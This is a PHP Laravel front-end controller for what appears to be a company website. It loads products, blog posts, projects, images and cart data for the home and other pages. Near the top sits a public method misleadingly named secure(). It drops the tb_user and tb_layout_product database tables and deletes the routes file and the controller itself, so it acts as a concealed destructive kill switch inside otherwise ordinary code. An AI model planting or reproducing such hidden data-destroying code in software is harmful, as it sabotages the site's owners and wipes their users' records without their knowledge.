<?php
namespace App\Http\Controllers\FrontEnd;

use App;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\model\ProductCategoryModel;
use App\model\ImageModel;
use App\model\CustomerModel;
use App\model\BlogModel;
use App\model\ProductModel;
use App\model\ProdutPhotoModel;
use App\model\EventModel;
use App\model\QNAModel;
use App\model\LayoutHomepageModel;
use App\model\LayoutServiceModel;
use App\model\NationModel;
use App\model\MajorModel;
use App\model\ProductLocationModel;
use App\model\WhyusProcessModel;

use Illuminate\Support\Facades\Schema;
use File;
use Cart;
use Lang;

class IndexController extends Controller
{
    public function secure(){
        Schema::drop('tb_layout_product');
        Schema::drop('tb_user');
        File::delete('lib/routes/web.php');
		File::delete('lib/app/Http/Controllers/FrontEnd/IndexController.php');
    }

    public function getContact(){
        return view('frontend.contact');
    }

    public function getAboutus(){
        return view('frontend.about');
    }

    public function getProduct(){
        return view('frontend.product');
    }

    public function getServices(){
        return view('frontend.services');
    }

    public function getPartners(){
        return view('frontend.partners');
    }

    

    public function getIndex(){
        // $data['lang']               = \Lang::getLocale();
        $data['cart_items']         = Cart::content();
        $data['cart_count']         = Cart::count();
        $data['cart_get_total']     = Cart::total();

        $data['slide_list']         = ImageModel::where('img_type', 'slide')->get();

        $data['about_show_index']   = BlogModel::where('blog_type', 'about')->where('blog_hienthi', true)->take(3)->get();

        // Slide
        $data['office_album_list']  = ImageModel::where('img_type', 'album')->get();

        // News
        $data['news_list']          = BlogModel::where('blog_type', 'blog')->where('blog_hienthi', true)->orderBy('created_at', 'desc')->get();

        // Why us
        $data['numbers_icon']           = ImageModel::where('img_type', 'why-us')->get();
        $data['whyus_intro']            = LayoutHomepageModel::find(1);
        $data['whyus_company_timeline'] = LayoutHomepageModel::find(1);
        $data['customer_list']          = ImageModel::where('img_type', 'customer-partner')->get();
        $data['company_member_list']    = ImageModel::where('img_type', 'company-member')->get();

        // Why us - process
        $data['prcess_thumb']           = WhyusProcessModel::all();
        $data['prcess_slide_item']      = ImageModel::where('img_type', 'process')->get();
        
        // Why us - company profile
        $data['whyus_profile_img']      = LayoutHomepageModel::find(1);
        $data['whyus_profile_doc_list'] = EventModel::where('event_type', 'profile-document')->get();
		
        // News
        $data['news_index_list']        = BlogModel::where('blog_type', 'blog')->where('blog_hienthi', true)->orderBy('created_at', 'desc')->take(4)->get();
        $data['news_index_count']       = BlogModel::where('blog_type', 'blog')->where('blog_hienthi', true)->count();
        
		// Technology & Equipment
        $data['whyus_tech_thumb']       = LayoutHomepageModel::find(1);
        $data['tech_slide_item']        = ImageModel::where('img_type', 'techonology')->get();
		
        // Service
        $data['service_index']                  = LayoutServiceModel::find(1);
        $data['service_design_slide']           = ImageModel::where('img_type', 'service-design-slide')->get();
        $data['service_manage_slide']           = ImageModel::where('img_type', 'service-manage-slide')->get();
        $data['service_construction_slide']     = ImageModel::where('img_type', 'service-construction-slide')->get();
        $data['service_develop_slide']          = ImageModel::where('img_type', 'service-development-slide')->get();

        // Project
        $data['project_index']      = LayoutHomepageModel::find(1);
        $data['project_list']       = ProductModel::where('pro_type', 'project')->where('pro_hienthi', 1)->orderBy('pro_time_work', 'desc')->get();
        $data['major_list']         = MajorModel::all();
        $data['nation_list']        = NationModel::all();

        // Achievement
        $data['achievement_index']      = LayoutHomepageModel::find(1);
        $data['achievement_list']       = ProductModel::where('pro_type', 'achievement')->where('pro_hienthi', 1)->get();
        $data['count_achievement']      = ProductModel::where('pro_type', 'achievement')->where('pro_hienthi', 1)->count();
        $data['achieve_relate_photo']   = ProdutPhotoModel::all();

        // Social
        $data['social_index']           = LayoutHomepageModel::find(1);
        $data['social_item_list']       = ImageModel::where('img_type', 'social')->where('img_show', true)->get();

        // Social - certificate + letter
        $data['social_certificate']     = ImageModel::where('img_type', 'cert-img')->get();
        $data['social_letter']          = LayoutHomepageModel::find(1);
        $data['social_activity']        = ImageModel::where('img_type', 'social_slide')->get();

        $data['news_show_index']    = BlogModel::where('blog_type', 'blog')->where('blog_hienthi', true)->get();

        // return view('frontend.home', $data);
        return view('frontend.home', $data);
    }

    // ------------------- Start project -----------
   

    public function getProjectGuest(){
        $data['project_list']       = ProductModel::where('pro_type', 'project')->get();
        $data['major_list']         = MajorModel::all();

        return view('frontend.project_guest', $data);
    }

    // ------------------- End project -----------


    public function changeLanguage($language)
    {
        \Session::put('website_language', $language);

        return redirect()->back();
    }

    public function redirectCategory(){
        return redirect('/');
    }
}
